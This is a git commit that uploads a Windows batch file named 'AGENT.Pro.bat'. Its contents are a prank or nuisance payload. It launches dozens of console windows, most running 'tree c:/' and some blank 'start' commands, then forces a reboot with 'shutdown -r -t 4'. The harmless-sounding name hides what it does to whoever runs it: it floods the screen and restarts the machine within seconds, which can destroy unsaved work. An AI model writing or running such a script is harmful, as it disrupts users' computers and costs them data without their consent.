faa803484733ebb7a8bdab9a02e74f010427921f
kanek09009 <98585753+kanek09009@users.noreply.github.com>
2022-01-30 11:20:02 +0900

    Add files via upload

---
+++ AGENT.Pro.bat
@@ -0,0 +1,44 @@
+@echo
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start tree c:/
+start
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+start tree c:/
+shutdown -r -t 4
+
+・
+・
+・
